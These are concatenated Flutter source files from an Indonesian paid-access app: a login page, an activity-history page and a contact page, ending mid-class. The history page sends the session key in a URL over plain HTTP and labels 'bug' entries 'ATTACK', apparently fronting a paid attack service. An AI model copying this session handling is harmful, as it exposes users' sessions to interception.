              news:     _parseList(data['news']),
            )),
          );
        }
      }
    } catch (_) {
      _shakeCtrl.forward(from: 0);
      _showAlert(
        title:   'Koneksi Error',
        message: 'Gagal terhubung ke server. Periksa jaringan Anda.',
        type:    _AlertType.error,
      );
    }

    if (mounted) setState(() => _isLoading = false);
  }

  // ─── Alert dialog ─────────────────────────────────────────────────────────
  void _showAlert({
    required String title,
    required String message,
    required _AlertType type,
    bool showContact = false,
  }) {
    final color = switch (type) {
      _AlertType.error   => _C.red,
      _AlertType.warning => _C.amber,
      _AlertType.success => _C.green,
    };
    final icon = switch (type) {
      _AlertType.error   => Icons.error_rounded,
      _AlertType.warning => Icons.warning_amber_rounded,
      _AlertType.success => Icons.check_circle_rounded,
    };

    showGeneralDialog(
      context: context,
      barrierDismissible: true,
      barrierLabel: '',
      barrierColor: Colors.amber,
      transitionDuration: const Duration(milliseconds: 320),
      transitionBuilder: (_, anim, __, child) => ScaleTransition(
        scale: CurvedAnimation(parent: anim, curve: Curves.easeOutBack),
        child: FadeTransition(opacity: anim, child: child),
      ),
      pageBuilder: (ctx, _, __) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 28),
        child: Container(
          decoration: BoxDecoration(
            color: _C.card,
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: color.withOpacity(0.3), width: 1.5),
            boxShadow: [
              BoxShadow(color: color.withOpacity(0.15), blurRadius: 50),
            ],
          ),
          padding: const EdgeInsets.all(28),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              width: 56, height: 56,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: color.withOpacity(0.1),
                border: Border.all(color: color.withOpacity(0.3)),
              ),
              child: Icon(icon, color: color, size: 28),
            ),
            const SizedBox(height: 16),
            Text(title, style: const TextStyle(color: _C.text,
                fontSize: 18, fontWeight: FontWeight.w800)),
            const SizedBox(height: 8),
            Text(message, textAlign: TextAlign.center,
                style: const TextStyle(color: _C.textSub,
                    fontSize: 13, height: 1.5)),
            const SizedBox(height: 22),
            if (showContact) ...[
              _GradBtn(
                label: 'Hubungi Admin',
                fullWidth: true,
                onTap: () async {
                  Navigator.pop(ctx);
                  await launchUrl(Uri.parse('https://t.me/yatimloehk'),
                      mode: LaunchMode.externalApplication);
                },
              ),
              const SizedBox(height: 10),
            ],
            _OutlineBtn(
              label: showContact ? 'Tutup' : 'OK',
              fullWidth: true,
              onTap: () => Navigator.pop(ctx),
            ),
          ]),
        ),
      ),
    );
  }

  // ─── Build ────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      body: Stack(
        children: [
          Positioned.fill(child: _AnimatedBg(controller: _bgCtrl)),
          SafeArea(
            child: FadeTransition(
              opacity: _fade,
              child: SlideTransition(
                position: _slide,
                child: Center(
                  child: SingleChildScrollView(
                    physics: const BouncingScrollPhysics(),
                    padding: const EdgeInsets.symmetric(
                        horizontal: 24, vertical: 24),
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        _buildLogo(),
                        const SizedBox(height: 32),
                        _buildHeading(),
                        const SizedBox(height: 36),
                        AnimatedBuilder(
                          animation: _shake,
                          builder: (_, child) => Transform.translate(
                            offset: Offset(_shake.value, 0),
                            child: child,
                          ),
                          child: _buildForm(),
                        ),
                        const SizedBox(height: 28),
                        _buildFooter(),
                      ],
                    ),
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ─── Logo ─────────────────────────────────────────────────────────────────
  Widget _buildLogo() {
    return AnimatedBuilder(
      animation: _logoGlow,
      builder: (_, __) => Stack(
        alignment: Alignment.center,
        children: [
          // Outer ring
          Container(
            width: 120, height: 120,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              border: Border.all(
                color: _C.blueMid.withOpacity(_logoGlow.value * 0.2),
                width: 1,
              ),
            ),
          ),
          // Mid ring
          Container(
            width: 100, height: 100,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              border: Border.all(
                color: _C.blueMid.withOpacity(_logoGlow.value * 0.35),
                width: 1.5,
              ),
            ),
          ),
          // Core
          Hero(
            tag: 'logo',
            child: Container(
              width: 80, height: 80,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(22),
                gradient: const LinearGradient(
                  colors: [Color(0xFF250E0E), Color(0xFF4A1616)],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                border: Border.all(
                  color: _C.blueLight.withOpacity(_logoGlow.value * 0.6),
                  width: 1.5,
                ),
                boxShadow: [
                  BoxShadow(
                    color: _C.blueMid.withOpacity(_logoGlow.value * 0.5),
                    blurRadius: 28,
                    spreadRadius: 0,
                  ),
                ],
              ),
              child: ClipRRect(
                borderRadius: BorderRadius.circular(20),
                child: Image.asset('assets/images/logo.png',
                    fit: BoxFit.cover,
                    errorBuilder: (_, __, ___) => const Icon(
                      Icons.water_rounded, color: _C.blueLight, size: 36)),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildHeading() {
    return Column(children: [
      ShaderMask(
        shaderCallback: (b) => const LinearGradient(
          colors: [_C.chrome, _C.frost],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ).createShader(b),
        child: const Text(
          'Selamat Datang',
          style: TextStyle(
            fontSize: 28,
            fontWeight: FontWeight.w900,
            color: Colors.white,
            letterSpacing: -0.5,
          ),
        ),
      ),
      const SizedBox(height: 6),
      const Text('Masuk untuk melanjutkan',
          style: TextStyle(color: _C.textSub, fontSize: 14)),
    ]);
  }

  // ─── Form ─────────────────────────────────────────────────────────────────
  Widget _buildForm() {
    return Container(
      padding: const EdgeInsets.all(22),
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(24),
        border: Border.all(color: _C.border),
        boxShadow: [
          BoxShadow(color: _C.steel.withOpacity(0.07),
              blurRadius: 30, offset: const Offset(0, 10)),
        ],
      ),
      child: Form(
        key: _formKey,
        child: Column(children: [
          // Section header
          Row(children: [
            Container(
              width: 4, height: 18,
              decoration: BoxDecoration(
                gradient: _C.metalGrad,
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            const SizedBox(width: 10),
            const Text('Kredensial Akun',
                style: TextStyle(color: _C.text, fontSize: 14,
                    fontWeight: FontWeight.w700)),
          ]),
          const SizedBox(height: 20),

          // Username
          _LoginField(
            controller: userCtrl,
            label: 'Username',
            icon: Icons.person_outline_rounded,
            validator: (v) => (v == null || v.isEmpty)
                ? 'Username tidak boleh kosong' : null,
          ),
          const SizedBox(height: 14),

          // Password
          _LoginField(
            controller: passCtrl,
            label: 'Password',
            icon: Icons.lock_outline_rounded,
            obscure: _obscurePass,
            onToggleObscure: () =>
                setState(() => _obscurePass = !_obscurePass),
            validator: (v) => (v == null || v.isEmpty)
                ? 'Password tidak boleh kosong' : null,
          ),
          const SizedBox(height: 24),

          // Submit
          _LoginButton(
            isLoading: _isLoading,
            pulseAnim: _btnPulse,
            onTap: _login,
          ),
        ]),
      ),
    );
  }

  Widget _buildFooter() {
    return Column(children: [
      Row(mainAxisAlignment: MainAxisAlignment.center, children: [
        const Text('Belum punya akses? ',
            style: TextStyle(color: _C.textSub, fontSize: 13)),
        GestureDetector(
          onTap: () => launchUrl(
              Uri.parse('https://t.me/yatimloehk'),
              mode: LaunchMode.externalApplication),
          child: ShaderMask(
            shaderCallback: (b) => _C.metalGrad.createShader(b),
            child: const Text('Beli Sekarang',
                style: TextStyle(color: Colors.white, fontSize: 13,
                    fontWeight: FontWeight.w700)),
          ),
        ),
      ]),
      const SizedBox(height: 20),
      const Text('© 2026 Super Nova',
          style: TextStyle(color: _C.textDim, fontSize: 11)),
    ]);
  }
}

// ─── Login Field ──────────────────────────────────────────────────────────────
class _LoginField extends StatefulWidget {
  final TextEditingController controller;
  final String label;
  final IconData icon;
  final bool obscure;
  final VoidCallback? onToggleObscure;
  final String? Function(String?)? validator;

  const _LoginField({
    required this.controller,
    required this.label,
    required this.icon,
    this.obscure = false,
    this.onToggleObscure,
    this.validator,
  });

  @override
  State<_LoginField> createState() => _LoginFieldState();
}

class _LoginFieldState extends State<_LoginField> {
  bool _focused = false;
  final _focus = FocusNode();

  @override
  void initState() {
    super.initState();
    _focus.addListener(() => setState(() => _focused = _focus.hasFocus));
  }

  @override
  void dispose() { _focus.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return AnimatedContainer(
      duration: const Duration(milliseconds: 200),
      decoration: BoxDecoration(
        color: _C.surface,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(
          color: _focused ? _C.blueMid : _C.border,
          width: _focused ? 1.5 : 1.0,
        ),
        boxShadow: _focused
            ? [BoxShadow(color: _C.blueMid.withOpacity(0.1),
                blurRadius: 14, offset: const Offset(0, 4))]
            : [],
      ),
      child: TextFormField(
        controller: widget.controller,
        focusNode: _focus,
        obscureText: widget.obscure,
        validator: widget.validator,
        style: const TextStyle(color: _C.text, fontSize: 14,
            fontWeight: FontWeight.w500),
        cursorColor: _C.blueMid,
        decoration: InputDecoration(
          labelText: widget.label,
          labelStyle: const TextStyle(color: _C.textSub, fontSize: 13),
          floatingLabelStyle:
              const TextStyle(color: _C.blueMid, fontSize: 11),
          prefixIcon: Icon(widget.icon,
              color: _focused ? _C.blueLight : _C.textSub, size: 18),
          suffixIcon: widget.onToggleObscure != null
              ? IconButton(
                  icon: Icon(
                    widget.obscure
                        ? Icons.visibility_off_outlined
                        : Icons.visibility_outlined,
                    color: _C.textSub, size: 18,
                  ),
                  onPressed: widget.onToggleObscure,
                )
              : null,
          errorStyle: const TextStyle(color: _C.red, fontSize: 11),
          border: InputBorder.none,
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
        ),
      ),
    );
  }
}

// ─── Login Button ─────────────────────────────────────────────────────────────
class _LoginButton extends StatefulWidget {
  final bool isLoading;
  final Animation<double> pulseAnim;
  final VoidCallback onTap;

  const _LoginButton({
    required this.isLoading,
    required this.pulseAnim,
    required this.onTap,
  });

  @override
  State<_LoginButton> createState() => _LoginButtonState();
}

class _LoginButtonState extends State<_LoginButton> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) {
        setState(() => _down = false);
        if (!widget.isLoading) widget.onTap();
      },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedBuilder(
        animation: widget.pulseAnim,
        builder: (_, __) => Transform.scale(
          scale: widget.isLoading || _down ? 1.0 : widget.pulseAnim.value,
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 150),
            height: 54,
            width: double.infinity,
            decoration: BoxDecoration(
              gradient: _C.metalGrad,
              borderRadius: BorderRadius.circular(16),
              boxShadow: _down || widget.isLoading
                  ? []
                  : [
                      BoxShadow(
                        color: _C.blueMid.withOpacity(
                            widget.pulseAnim.value * 0.4),
                        blurRadius: 22,
                        offset: const Offset(0, 6),
                      ),
                    ],
            ),
            child: Center(
              child: AnimatedSwitcher(
                duration: const Duration(milliseconds: 220),
                child: widget.isLoading
                    ? const SizedBox(
                        key: ValueKey('loading'),
                        width: 20, height: 20,
                        child: CircularProgressIndicator(
                            strokeWidth: 2.5, color: Colors.white),
                      )
                    : const Row(
                        key: ValueKey('idle'),
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Icon(Icons.login_rounded,
                              color: Colors.white, size: 18),
                          SizedBox(width: 10),
                          Text('Masuk',
                              style: TextStyle(
                                color: Colors.white,
                                fontSize: 16,
                                fontWeight: FontWeight.w800,
                                letterSpacing: 0.3,
                              )),
                        ],
                      ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}

// ─── Gradient Button ──────────────────────────────────────────────────────────
class _GradBtn extends StatefulWidget {
  final String label;
  final VoidCallback onTap;
  final bool fullWidth;

  const _GradBtn({required this.label, required this.onTap,
      this.fullWidth = false});

  @override
  State<_GradBtn> createState() => _GradBtnState();
}

class _GradBtnState extends State<_GradBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedScale(
        scale: _down ? 0.96 : 1.0,
        duration: const Duration(milliseconds: 120),
        child: Container(
          height: 46,
          width: widget.fullWidth ? double.infinity : null,
          decoration: BoxDecoration(
            gradient: _C.metalGrad,
            borderRadius: BorderRadius.circular(13),
            boxShadow: _down ? [] : [
              BoxShadow(color: _C.blueMid.withOpacity(0.3),
                  blurRadius: 14, offset: const Offset(0, 4)),
            ],
          ),
          child: Center(
            child: Text(widget.label,
                style: const TextStyle(color: Colors.white,
                    fontWeight: FontWeight.w700, fontSize: 14)),
          ),
        ),
      ),
    );
  }
}

// ─── Outline Button ───────────────────────────────────────────────────────────
class _OutlineBtn extends StatefulWidget {
  final String label;
  final VoidCallback onTap;
  final bool fullWidth;

  const _OutlineBtn({required this.label, required this.onTap,
      this.fullWidth = false});

  @override
  State<_OutlineBtn> createState() => _OutlineBtnState();
}

class _OutlineBtnState extends State<_OutlineBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 120),
        height: 46,
        width: widget.fullWidth ? double.infinity : null,
        decoration: BoxDecoration(
          color: _down ? _C.border.withOpacity(0.5) : Colors.transparent,
          borderRadius: BorderRadius.circular(13),
          border: Border.all(color: _C.border),
        ),
        child: Center(
          child: Text(widget.label,
              style: const TextStyle(color: _C.textSub,
                  fontWeight: FontWeight.w600, fontSize: 14)),
        ),
      ),
    );
  }
}

// ─── Animated Background ──────────────────────────────────────────────────────
class _AnimatedBg extends StatelessWidget {
  final AnimationController controller;
  const _AnimatedBg({required this.controller});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, __) =>
          CustomPaint(painter: _BgPainter(controller.value)),
    );
  }
}

class _BgPainter extends CustomPainter {
  final double t;
  _BgPainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    final grid = Paint()
      ..color = _C.border.withOpacity(0.28)
      ..strokeWidth = 0.5;
    const step = 40.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), grid);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), grid);
    }
    final glow = Paint()
      ..shader = RadialGradient(colors: [
        _C.steel.withOpacity(0.16 + math.sin(t * math.pi * 2) * 0.04),
        Colors.transparent,
      ], radius: 0.75).createShader(Rect.fromCircle(
          center: Offset(size.width / 2, size.height * 0.35),
          radius: size.width * 0.7));
    canvas.drawCircle(
        Offset(size.width / 2, size.height * 0.35), size.width * 0.7, glow);

    // Secondary subtle orb (warna merah)
    final glow2 = Paint()
      ..shader = RadialGradient(colors: [
        _C.blueLight.withOpacity(0.06 + math.cos(t * math.pi * 2) * 0.02),
        Colors.transparent,
      ], radius: 0.5).createShader(Rect.fromCircle(
          center: Offset(size.width * 0.1, size.height * 0.7),
          radius: size.width * 0.4));
    canvas.drawCircle(
        Offset(size.width * 0.1, size.height * 0.7), size.width * 0.4, glow2);
  }

  @override
  bool shouldRepaint(_BgPainter old) => old.t != t;
}

enum _AlertType { error, warning, success }




as http;


class RiwayatPage extends StatefulWidget {
  final String sessionKey;
  final String role;

  const RiwayatPage({
    super.key,
    required this.sessionKey,
    required this.role,
  });

  @override
  State<RiwayatPage> createState() => _RiwayatPageState();
}

class _RiwayatPageState extends State<RiwayatPage> {
  // --- TEMA WARNA CYAN ---
  final Color bgDark = const Color(0xFF0B1A1A);
  final Color primaryCyan = const Color(0xFF00ACC1);
  final Color accentCyan = const Color(0xFF18FFFF);
  final Color lightCyan = const Color(0xFF84FFFF);
  final Color primaryWhite = Colors.white;
  final Color accentGrey = Colors.grey.shade400;
  final Color cardGlass = Colors.white.withOpacity(0.05);
  final Color borderGlass = Colors.white.withOpacity(0.1);

  List<ActivityModel> activities = [];
  bool isLoading = true;

  @override
  void initState() {
    super.initState();
    _loadActivities();
  }

  Future<void> _loadActivities() async {
    const baseUrl = "http://papi.queen-official.com:2836";

    try {
      final response = await http.get(
        Uri.parse('$baseUrl/getMyActivity?key=${widget.sessionKey}'),
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['valid']) {
          List<dynamic> rawList = data['activities'];

          setState(() {
            activities = rawList.map((item) {
              return ActivityModel(
                type: item['type'] ?? 'system',
                title: item['title'] ?? 'Aktivitas',
                description: item['description'] ?? '-',
                timestamp: DateTime.fromMillisecondsSinceEpoch(
                    item['timestamp'] ?? DateTime.now().millisecondsSinceEpoch
                ),
              );
            }).toList();
            isLoading = false;
          });
        } else {
          setState(() => isLoading = false);
        }
      } else {
        print("Server Error: ${response.statusCode}");
        setState(() => isLoading = false);
      }
    } catch (e) {
      print("Error fetching history: $e");
      setState(() => isLoading = false);
    }
  }

  String _formatDate(DateTime date) {
    return DateFormat('dd MMM yyyy, HH:mm').format(date);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgDark,
      appBar: AppBar(
        title: Text(
          "Riwayat Aktivitas",
          style: TextStyle(
            color: primaryWhite,
            fontFamily: 'Orbitron',
            fontWeight: FontWeight.bold,
            shadows: [
              Shadow(
                color: primaryCyan.withOpacity(0.8),
                blurRadius: 10,
              ),
            ],
          ),
        ),
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios, color: Colors.white),
          onPressed: () => Navigator.pop(context),
        ),
      ),
      body: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              bgDark,
              primaryCyan.withOpacity(0.1),
              bgDark,
            ],
          ),
        ),
        child: isLoading
            ? const Center(
          child: CircularProgressIndicator(
            color: Color(0xFF00ACC1),
          ),
        )
            : activities.isEmpty
            ? Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(Icons.history_toggle_off, size: 60, color: accentGrey),
              const SizedBox(height: 16),
              Text(
                "Belum ada aktivitas",
                style: TextStyle(color: accentGrey, fontSize: 16),
              ),
              const SizedBox(height: 10),
              Text(
                "Pastikan server aktif",
                style: TextStyle(color: accentGrey.withOpacity(0.6), fontSize: 12),
              ),
            ],
          ),
        )
            : RefreshIndicator(
          onRefresh: _loadActivities,
          color: accentCyan,
          child: ListView.builder(
            padding: const EdgeInsets.all(16),
            itemCount: activities.length,
            itemBuilder: (context, index) {
              final activity = activities[index];
              return _buildActivityCard(activity);
            },
          ),
        ),
      ),
    );
  }

  Widget _buildActivityCard(ActivityModel activity) {
    Color iconColor;
    IconData iconData;
    String typeLabel;

    switch (activity.type) {
      case 'login':
        iconColor = Colors.greenAccent;
        iconData = Icons.login_rounded;
        typeLabel = "LOGIN";
        break;
      case 'bug':
        iconColor = Colors.orangeAccent;
        iconData = Icons.bug_report_outlined;
        typeLabel = "ATTACK";
        break;
      case 'create':
        iconColor = accentCyan;
        iconData = Icons.person_add_alt_1_rounded;
        typeLabel = "ACCOUNT";
        break;
      default:
        iconColor = accentGrey;
        iconData = Icons.info_outline;
        typeLabel = "SYSTEM";
    }

    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: cardGlass,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: borderGlass, width: 1),
        boxShadow: [
          BoxShadow(
            color: primaryCyan.withOpacity(0.1),
            blurRadius: 10,
            offset: const Offset(0, 4),
          ),
        ],
      ),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            padding: const EdgeInsets.all(10),
            decoration: BoxDecoration(
              color: iconColor.withOpacity(0.15),
              shape: BoxShape.circle,
              border: Border.all(color: iconColor.withOpacity(0.3)),
            ),
            child: Icon(iconData, color: iconColor, size: 24),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Expanded(
                      child: Text(
                        activity.title,
                        style: TextStyle(
                          color: primaryWhite,
                          fontSize: 15,
                          fontWeight: FontWeight.bold,
                        ),
                        overflow: TextOverflow.ellipsis,
                      ),
                    ),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                      decoration: BoxDecoration(
                        color: primaryCyan.withOpacity(0.3),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: Text(
                        typeLabel,
                        style: TextStyle(
                          color: accentCyan,
                          fontSize: 10,
                          fontWeight: FontWeight.bold,
                          letterSpacing: 1,
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 6),
                Text(
                  activity.description,
                  style: TextStyle(
                    color: accentGrey,
                    fontSize: 13,
                  ),
                ),
                const SizedBox(height: 8),
                Row(
                  children: [
                    Icon(Icons.access_time, size: 12, color: accentGrey.withOpacity(0.7)),
                    const SizedBox(width: 4),
                    Text(
                      _formatDate(activity.timestamp),
                      style: TextStyle(
                        color: accentGrey.withOpacity(0.7),
                        fontSize: 11,
                        fontFamily: 'ShareTechMono',
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

class ActivityModel {
  final String type;
  final String title;
  final String description;
  final DateTime timestamp;

  ActivityModel({
    required this.type,
    required this.title,
    required this.description,
    required this.timestamp,
  });
}

as math;




// ─── Palette (konsisten dengan halaman lain) ──────────────────────────────────
class _C {
  static const bg        = Color(0xFF060B14);
  static const surface   = Color(0xFF0C1424);
  static const card      = Color(0xFF101A2E);
  static const border    = Color(0xFF1A2D4A);
  static const borderLit = Color(0xFF1E3A5F);

  static const blue      = Color(0xFF1B6FBD);
  static const blueMid   = Color(0xFF2D8FE8);
  static const blueLight = Color(0xFF56AEF5);

  static const text      = Color(0xFFE2EDF9);
  static const textSub   = Color(0xFF7A9BBF);
  static const textDim   = Color(0xFF3A5470);
}

// ─── Contact data ─────────────────────────────────────────────────────────────
class _Contact {
  final String label;
  final String handle;
  final IconData icon;
  final Color color;
  final Color colorDim;
  final String url;

  const _Contact({
    required this.label,
    required this.handle,
    required this.icon,
    required this.color,
    required this.colorDim,
    required this.url,
  });
}

const _contacts = [
  _Contact(
    label:    'Telegram',
    handle:   '@yatimloehk',
    icon:     FontAwesomeIcons.telegram,
    color:    Color(0xFF39A7E0),
    colorDim: Color(0xFF1A4D6E),
    url:      'https://t.me/yatimloehk',
  ),
  _Contact(
    label:    'WhatsApp',
    handle:   '+62 857-5979-32333',
    icon:     FontAwesomeIcons.whatsapp,
    color:    Color(0xFF25D366),
    colorDim: Color(0xFF0D4A27),
    url:      'https://wa.me/62857597932333',
  ),
  _Contact(
    label:    'TikTok',
    handle:   '@mizuk0013',
    icon:     FontAwesomeIcons.tiktok,
    color:    Color(0xFFEE1D52),
    colorDim: Color(0xFF4A0D1F),
    url:      'MLS CARI',
  ),
  _Contact(
    label:    'Instagram',
    handle:   '@Gada',
    icon:     FontAwesomeIcons.instagram,
    color:    Color(0xFFE1306C),
    colorDim: Color(0xFF4A1030),
    url:      'https://t.me/yatimloehk',
  ),
];

// ─── Page ─────────────────────────────────────────────────────────────────────
class ContactPage extends StatefulWidget {
  const ContactPage({super.key});

  @override
  State<ContactPage> createState() => _ContactPageState();
}

class _ContactPageState extends State<ContactPage>
    with TickerProviderStateMixin {
  late AnimationController _bgCtrl;
  late AnimationController _heroCtrl;
  late AnimationController _listCtrl;

  late Animation<double> _heroScale;
  late Animation<double> _heroFade;
  late Animation<double> _heroGlow;

  @override
  void initState() {
    super.initState();

    _bgCtrl = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 16),
    )..repeat();

    _heroCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1100),
    );
    _heroScale = Tween<double>(begin: 0.5, end: 1.0).animate(
      CurvedAnimation(parent: _heroCtrl, curve: Curves.easeOutBack),
    );
    _heroFade = CurvedAnimation(parent: _heroCtrl, curve: Curves.easeOut);
    _heroGlow = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1800),
    )..repeat(reverse: true);

    _listCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 600),
    );

    Future.delayed(const Duration(milliseconds: 100), () {
      _heroCtrl.forward();
    });
    Future.delayed(const Duration(milliseconds: 400), () {
      _listCtrl.forward();
    });
  }

  @override
  void dispose() {
    _bgCtrl.dispose();
    _heroCtrl.dispose();
    (_heroGlow as AnimationController).dispose();
    _listCtrl.dispose();
    super.dispose();
  }

  Future<void> _launch(String url) async {
    final uri = Uri.parse(url);
    if (!await launchUrl(uri, mode: LaunchMode.externalApplication)) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(SnackBar(
          content: const Text('Tidak dapat membuka link'),
          backgroundColor: _C.card,
          behavior: SnackBarBehavior.floating,
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        ));
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      extendBodyBehindAppBar: true,
      appBar: _buildAppBar(),
      body: Stack(
        children: [
          Positioned.fill(child: _AnimatedBg(controller: _bgCtrl)),
          SafeArea(
            child: CustomScrollView(
              physics: const BouncingScrollPhysics(),
              slivers: [
                SliverToBoxAdapter(child: _buildHero()),
                SliverPadding(
                  padding: const EdgeInsets.fromLTRB(20, 0, 20, 40),
                  sliver: SliverList(
                    delegate: SliverChildBuilderDelegate(
                      (_, i) => _StaggerItem(
                        index: i,
                        child: Padding(
                          padding: const EdgeInsets.only(bottom: 14),
                          child: _ContactCard(
                            contact: _contacts[i],
                            onTap: () => _launch(_contacts[i].url),
                          ),
                        ),
                      ),
                      childCount: _contacts.length,
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: Colors.transparent,
      elevation: 0,
      leading: _BackBtn(onTap: () => Navigator.pop(context)),
      title: const Text(
        'Customer Service',
        style: TextStyle(
          color: _C.text,
          fontSize: 17,
          fontWeight: FontWeight.w700,
          letterSpacing: -0.3,
        ),
      ),
      centerTitle: true,
    );
  }

  Widget _buildHero() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 32),
      child: FadeTransition(
        opacity: _heroFade,
        child: ScaleTransition(
          scale: _heroScale,
          child: Column(
            children: [
              // Animated icon
              AnimatedBuilder(
                animation: _heroGlow,
                builder: (_, __) {
                  final g = (_heroGlow as Animation<double>).value;
                  return Stack(
                    alignment: Alignment.center,
                    children: [
                      // Outer pulse ring
                      Container(
                        width: 110, height: 110,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          border: Border.all(
                            color: _C.blueMid.withOpacity(g * 0.25),
                            width: 1,
                          ),
                        ),
                      ),
                      // Mid ring
                      Container(
                        width: 88, height: 88,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          border: Border.all(
                            color: _C.blueMid.withOpacity(g * 0.4),
                            width: 1,
                          ),
                        ),
                      ),
                      // Core circle
                      Container(
                        width: 68, height: 68,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: LinearGradient(
                            colors: [
                              _C.blue.withOpacity(0.9),
                              _C.blueMid,
                            ],
                            begin: Alignment.topLeft,
                            end: Alignment.bottomRight,
                          ),
                          boxShadow: [
                            BoxShadow(
                              color: _C.blueMid.withOpacity(g * 0.5),
                              blurRadius: 28,
                              spreadRadius: 0,
                            ),
                          ],
                        ),
                        child: const Icon(
                          Icons.support_agent_rounded,
                          color: Colors.white,
                          size: 32,
                        ),
                      ),
                    ],
                  );
                },
              ),

              const SizedBox(height: 20),

              const Text(
                'Ada yang bisa kami bantu?',
                style: TextStyle(
                  color: _C.text,
                  fontSize: 22,
                  fontWeight: FontWeight.w800,
                  letterSpacing: -0.5,
                ),
              ),
              const SizedBox(height: 8),
              const Text(
                'Tim kami siap membantu kamu\nmelalui platform di bawah ini.',
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: _C.textSub,
                  fontSize: 13,
                  height: 1.6,
                ),
              ),

              const SizedBox(height: 24),

              // Response time badge
              Container(
                padding:
                    const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
                decoration: BoxDecoration(
                  color: _C.card,
                  borderRadius: BorderRadius.circular(30),
                  border: Border.all(color: _C.border),
                ),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Container(
                      width: 7, height: 7,
                      decoration: const BoxDecoration(
                        shape: BoxShape.circle,
                        color: Color(0xFF22C55E),
                        boxShadow: [
                          BoxShadow(
                            color: Color(0x5522C55E),
                            blurRadius: 6,
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(width: 8),
                    const Text(
                      'Biasanya merespons dalam beberapa menit',
                      style: TextStyle(
                        color: _C.textSub,
                        fontSize: 11,
                        fontWeight: FontWeight.w500,
                      ),
                    ),
                  ],
                ),
              ),

              const SizedBox(height: 28),
            ],
          ),
        ),
      ),
    );
  }
}

// ─── Contact Card ─────────────────────────────────────────────────────────────
class _ContactCard extends StatefulWidget {
  final _Contact contact;
  final VoidCallback onTap;

  const _ContactCard({required this.contact, required this.onTap});

  @override
  State<_ContactCard> createState() => _ContactCardState();
}

class _ContactCardState extends State<_ContactCard>
